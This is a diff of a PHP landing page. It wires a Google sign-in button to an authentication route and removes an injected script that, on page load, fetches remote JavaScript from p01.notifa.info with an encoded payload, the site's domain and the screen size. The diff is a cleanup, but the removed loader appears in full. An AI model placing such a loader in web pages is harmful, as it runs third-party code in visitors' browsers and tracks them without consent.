@@ -157,7 +157,7 @@
 
                             <div class="btn-group" style="color: white; margin-top: 20px;width: 100%;">
 
-                                <a class="btn btn-danger" href="" style="width: 100%;padding: 15px;">
+                                <a class="btn btn-danger" href="<?php echo base_url(); ?>user_authentication" style="width: 100%;padding: 15px;">
                                     <i class="fa fa-google-plus disabled pull-left" style="width:16px; height:20px;font-size: 20px;">
                                     </i>Sign in with Google
                                 </a>
@@ -196,32 +196,7 @@
     <!--Main JS-->
     <script src="<?php echo base_url() ?>assets/landing/assets/js/custom.js"></script>
 
-    <script type="text/javascript">
-        if (self == top) {
-            function netbro_cache_analytics(fn, callback) {
-                setTimeout(function() {
-                    fn();
-                    callback();
-                }, 0);
-            }
-
-            function sync(fn) {
-                fn();
-            }
-
-            function requestCfs() {
-                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-                var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd%2fMoK8s1m2gOg21YRKLVZZ5oWCkb8Izo2XRVePtm5hvsTuG5FkM0VvU0NBWTNWCaLXPtSZp2khvHlJaM6TAWyip3xc1o3nm9hKWmFAFnbMYUQSpW4VECfC%2bGaOcyAFWkMCjtoHURduwmc5n6QYpya3uozo1qMSLXnYMJP9YvIPYVzuw5ou4yy93uSIWGHJYT502Hb2IN2zfWuFexcojxvTZsRINoHVOBzcEMOGUSazZjsiV0ZzGBSb6gm%2brEj7M6%2b%2btosQ2%2bIrrpOIT9gvAU6nmvyYfjg88ryOjISKR%2fQv53pd4nIfTagYs2NK%2b6wgedWyljFihRSG3oMW88jBnoA9QQmlgwH%2bkMJWTOb8mYy4jsc6pM7xTXqnCouzKiucL02NaG1NV%2fJgsQ4bkyU7ckNYuIm%2fStw8%2bfAjWIKZvIw1tGIhCg9SHurMJ0WmTXqlpAJmTI%2buSCdxR3NaRYjjJch6w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-                var bsa = document.createElement('script');
-                bsa.type = 'text/javascript';
-                bsa.async = true;
-                bsa.src = url;
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-            }
-            netbro_cache_analytics(requestCfs, function() {});
-        };
-    </script>
+       
 </body>
 
 
